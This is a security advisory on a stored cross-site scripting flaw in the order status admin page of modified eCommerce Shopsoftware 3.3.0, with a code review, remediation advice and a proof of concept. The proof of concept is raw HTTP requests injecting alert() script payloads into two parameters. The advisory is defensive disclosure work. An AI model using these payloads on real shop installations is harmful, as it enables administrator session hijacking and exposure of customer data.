# Offensive Security Advisory: Stored XSS

## 1. Executive Summary and Business Impact

During an offensive security assessment conducted in a lab environment of the **modified eCommerce Shopsoftware** platform (version 3.3.0 rev 16825), a critical **Stored Cross-Site Scripting (Stored XSS - CWE-79)** vulnerability was identified in the administrative order status management module (`admin/orders_status.php`).

This flaw allows an operator with access to the administrative interface to inject arbitrary JavaScript code into fields persisted in the MariaDB database. Because the data is not sanitized upon output, the payload is silently executed in the browser of any other administrator accessing the listing.

**Business Risk:** In an e-commerce context, administrative session hijacking via XSS can lead to the compromise of sensitive customer data (PII), internal interface defacement, and unauthorized actions (CSRF), posing a severe risk of privacy violations (e.g., GDPR/LGPD compliance failure).

## 2. Scope and Methodology (PTES)

The assessment followed the *Penetration Testing Execution Standard* (PTES) phases, covering threat modeling, static source code analysis (SAST), and dynamic validation (DAST).

| Parameter | Details |
| :--- | :--- |
| **Target Application** | modified eCommerce Shopsoftware v3.3.0 rev 16825 |
| **Environment** | Apache/2.4.65 (Debian) / PHP 8.1.34 / MariaDB |
| **Vulnerable Endpoint** | `/admin/orders_status.php` |
| **Parameters** | `orders_status_name[language_id]` and `MAX_DISPLAY_ORDERS_STATUS_RESULTS` |
| **Severity** | High (CVSS v3.1: `7.2` - `AV:N/AC:L/PR:H/UI:R/S:C/C:H/I:L/A:N`) |

## 3. Technical Analysis and Root Cause (Code Review)

The vulnerability stems from a lack of Context-Aware Output Encoding.

### 3.1. Input and Persistence (Insufficient Sanitization)
In the registration block (lines 35–40), the system receives names submitted via POST. The value passes through the `xtc_db_prepare_input()` function, which only performs basic handling (like `trim` and `stripslashes`) but **does not neutralize HTML or JavaScript tags**. The data is then persisted via `xtc_db_perform()` in the `TABLE_ORDERS_STATUS` table.

### 3.2. Vulnerable Output (Payload Execution)
When the endpoint retrieves records for display (lines 193–197), the status name is directly inserted into the HTML without any escape functions:

```php
// Direct output without htmlspecialchars()
echo '<td class="dataTableContent">'
    . $orders_status['orders_status_name']
    . '</td>' . "\n";
```
This vulnerable behavior occurs in multiple points, such as the deletion confirmation screen (line 264), the details header (line 274), and the return of the auxiliary function `xtc_get_orders_status_name()`.

*Note on SQL Injection:* Code analysis confirmed that persistence functions perform Integer Type Casting (e.g., `(int)$_POST['sort_order']`) and utilize database layer escaping, protecting the application against SQL Injection in this specific flow.

## 4. Dynamic Proof of Concept (PoC)

Exploitation was validated through HTTP traffic interception. Two distinct vectors were explored:

### Vector A: Injection in Status Name (`orders_status_name`)
The attacker edits a record and injects the payload into the name parameter:

```http
POST /admin/orders_status.php?page=1&oID=1&action=save HTTP/1.1
Host: 172.21.219.184:8080
Content-Type: application/x-www-form-urlencoded

orders_status_name%5B1%5D=Offen&orders_status_name%5B2%5D=Pending%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
```
Upon rendering the list, the server reflects the active payload:
```html
<td class="dataTableContent">Pending<script>alert(document.domain)</script></td>
```

### Vector B: Attribute Breakout (`MAX_DISPLAY_ORDERS_STATUS_RESULTS`)
The pagination field allows code injection by breaking out of the HTML `value` attribute:

```http
POST /admin/orders_status.php HTTP/1.1
Host: 172.21.219.184:8080
Content-Type: application/x-www-form-urlencoded

MAX_DISPLAY_ORDERS_STATUS_RESULTS=20"%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E
```
Resulting HTML returned by the server:
```html
<input type="text" name="MAX_DISPLAY_ORDERS_STATUS_RESULTS" value="20"><script>alert(1)</script>" style="width: 40px">
```

## 5. Remediation Plan (Defense in Depth)

### 5.1. Tactical (Code Level)
Always apply HTML encoding when `orders_status_name` is inserted into a View context. Input validation must never replace output encoding.
```php
echo '<td class="dataTableContent">'
    . htmlspecialchars(
        $orders_status['orders_status_name'],
        ENT_QUOTES | ENT_SUBSTITUTE,
        'UTF-8'
    )
    . '</td>';
```
For strictly numeric fields like pagination limits, ensure Type Casting to integer upon data reception `(int)$_POST['MAX_DISPLAY_ORDERS_STATUS_RESULTS']`.

### 5.2. Strategic (Architecture Level)
*   **Content Security Policy (CSP):** Implement the `Content-Security-Policy: default-src 'self'; script-src 'self';` HTTP header to neutralize *inline* script execution.
*   **Session Cookies:** Ensure the use of `HttpOnly` and `Secure` flags on administrative cookies to mitigate session hijacking via XSS attacks.